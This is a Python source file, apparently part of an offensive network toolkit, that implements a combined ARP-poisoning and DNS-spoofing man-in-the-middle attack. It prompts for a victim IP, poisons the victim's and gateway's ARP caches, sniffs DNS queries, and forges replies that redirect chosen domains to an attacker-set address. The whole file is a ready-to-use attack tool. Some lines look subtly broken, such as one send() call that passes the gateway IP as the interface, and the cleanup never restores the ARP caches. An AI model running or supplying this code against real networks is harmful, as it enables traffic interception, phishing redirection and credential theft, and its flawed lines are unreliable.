import time
import threading
import platform
import subprocess
import socket
from scapy.all import send, conf
from scapy.layers.l2 import ARP
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSQR, DNSRR
from Server.core.remote_output import remote_print

# Optional: if you use a custom helper for network info
try:
    from core.network_info import get_my_ip, get_my_mac, get_default_gateway
except ImportError:
    # Fallbacks if running standalone
    from scapy.all import get_if_addr


    def get_my_ip(iface=None):
        return get_if_addr(iface or conf.iface)


    def get_my_mac(iface=None):
        return conf.route.route("0.0.0.0")[1]


    def get_default_gateway():
        return conf.route.route("0.0.0.0")[2]


def set_ip_forwarding(enable: bool):
    """Enables or disables IP forwarding across Windows, Linux, and macOS."""
    os_name = platform.system()
    state_str = "Enabling" if enable else "Disabling"
    remote_print(f"[*] {state_str} IP forwarding...")

    val_linux = "1" if enable else "0"
    val_win = "Enabled" if enable else "Disabled"

    try:
        if os_name == "Linux":
            subprocess.run(["sysctl", "-w", f"net.ipv4.ip_forward={val_linux}"], check=True, stdout=subprocess.DEVNULL)
        elif os_name == "Darwin":  # macOS
            subprocess.run(["sysctl", "-w", f"net.inet.ip.forwarding={val_linux}"], check=True,
                           stdout=subprocess.DEVNULL)
        elif os_name == "Windows":
            subprocess.run(["powershell", "-Command", f"Set-NetIPInterface -Forwarding {val_win}"], check=True,
                           stdout=subprocess.DEVNULL)
        else:
            remote_print(f"[-] Unsupported OS ({os_name}) for automatic IP forwarding.")
    except Exception as e:
        remote_print(f"[-] Failed to modify IP forwarding state: {e}")
        remote_print("[-] Make sure you are running with Administrator / Root privileges!")


def resolve_to_ip(target_input: str) -> str:
    """
    Checks if input is an IP address. If it's a domain name (e.g., youtube.com),
    it resolves it to an IP address automatically using system DNS.
    """
    target_input = target_input.strip()
    try:
        # Check if it's already a valid IPv4 address
        socket.inet_aton(target_input)
        return target_input
    except socket.error:
        # It's a domain name, resolve it
        try:
            resolved_ip = socket.gethostbyname(target_input)
            remote_print(f"[*] Resolved domain '{target_input}' to IP: {resolved_ip}")
            return resolved_ip
        except Exception as e:
            remote_print(f"[-] Error resolving domain '{target_input}': {e}")
            return target_input


def start_dns_spoofer(
        victim_ip: str = None,
        target_domain: str = "example.com",
        spoof_ip: str = "192.168.1.50",
        iface: str = None,
        **kwargs
):
    """
    1. Ensures victim IP is provided (prompts if missing).
    2. Enables IP forwarding (prevents DoS).
    3. Parses Host and Port if provided in IP:PORT format.
    4. Resolves domain/IP redirect target.
    5. Starts ARP spoofing in the background.
    6. Starts DNS spoofing.
    """
    target_iface = iface or conf.iface
    gateway_ip = get_default_gateway()
    attacker_mac = get_my_mac(target_iface)

    # Prompt for victim IP if not passed as an argument
    if not victim_ip:
        victim_ip = input("Enter victim IP to target for DNS/MiTM: ").strip()

    if not victim_ip:
        remote_print("[-] Victim IP is required for network-wide DNS spoofing.")
        return

    # --- Parse Host and Port (e.g., 192.168.1.236:8080) ---
    target_host = spoof_ip
    target_port = "80"  # Default web port

    if ":" in spoof_ip and not spoof_ip.startswith("http"):
        parts = spoof_ip.rsplit(":", 1)
        target_host = parts[0]
        target_port = parts[1]

    # Resolve host to an IPv4 address
    resolved_spoof_ip = resolve_to_ip(target_host)

    remote_print(f"[RED] Starting DNS Spoofer & MiTM for target {victim_ip}...")
    remote_print(f"[*] Domain '{target_domain}' -> pointing to IP {resolved_spoof_ip} (Target Port: {target_port})")

    if target_port != "80" and target_port != "443":
        remote_print(
            f"[!] Note: DNS records point to an IP. To catch traffic on port {target_port}, ensure port redirection (NAT) is active on your machine.")

    # 1. Enable IP Forwarding so the victim doesn't experience a DoS
    set_ip_forwarding(enable=True)

    is_running = True

    # 2. Start ARP Spoofing Thread (Must happen before DNS spoofing)
    pkt_to_victim = ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwsrc=attacker_mac)
    pkt_to_gateway = ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwsrc=attacker_mac)

    def arp_loop():
        while is_running:
            try:
                send(pkt_to_victim, iface=target_iface, verbose=False)
                send(pkt_to_gateway, iface=gateway_ip, psrc=victim_ip, hwsrc=attacker_mac)
            except Exception:
                pass
            time.sleep(2.0)

    arp_worker = threading.Thread(target=arp_loop, daemon=True)
    arp_worker.start()
    remote_print(f"[+] ARP Spoofing active: {victim_ip} <-> {gateway_ip}")

    # Give ARP a moment to settle
    time.sleep(1.0)

    # 3. DNS Spoofing Logic
    def handle_dns_packet(packet):
        if not is_running:
            return

        if packet.haslayer(DNS) and packet[DNS].qr == 0 and packet.haslayer(DNSQR):
            qname = packet[DNSQR].qname.decode("utf-8", errors="ignore").strip(".")

            if target_domain.lower() in qname.lower() or target_domain == "*":
                try:
                    ip_layer = packet[IP]
                    udp_layer = packet[UDP]
                    dns_layer = packet[DNS]

                    spoofed_pkt = (
                            IP(dst=ip_layer.src, src=ip_layer.dst) /
                            UDP(dport=udp_layer.sport, sport=udp_layer.dport) /
                            DNS(
                                id=dns_layer.id,
                                qr=1,
                                aa=1,
                                rd=dns_layer.rd,
                                qd=dns_layer.qd,
                                an=DNSRR(rrname=packet[DNSQR].qname, ttl=60, rdata=resolved_spoof_ip)
                            )
                    )

                    send(spoofed_pkt, iface=target_iface, verbose=False)
                    remote_print(f"[RED] Spoofed DNS Query: {qname} -> Redirected to {resolved_spoof_ip}:{target_port}")
                except Exception:
                    pass

    # Start network sniffer for DNS queries (UDP port 53)
    try:
        from core.sniffer import NetworkSniffer
        sniffer = NetworkSniffer(
            packet_filter="udp dst port 53",
            action_on_packet=handle_dns_packet,
            iface=target_iface
        )
        sniffer.start()
        remote_print(f"[+] DNS Spoofer active. Intercepting traffic from {victim_ip}...")
    except ImportError:
        remote_print("[-] Warning: core.sniffer module not found.")
        sniffer = None

    try:
        input("\n[!] Attack running. Press Enter to stop and clean up...\n")
    finally:
        # 4. Cleanup & State Restoration
        remote_print("[*] Stopping attack and restoring network state...")
        is_running = False
        if sniffer:
            try:
                sniffer.stop()
            except Exception:
                pass

        # Disable IP forwarding to return system to original safe state
        set_ip_forwarding(enable=False)
        remote_print("[+] Cleanup complete. DNS Spoofer stopped.")


# Create an alias so either function name works across different files
start_mitm_and_dns_spoof = start_dns_spoofer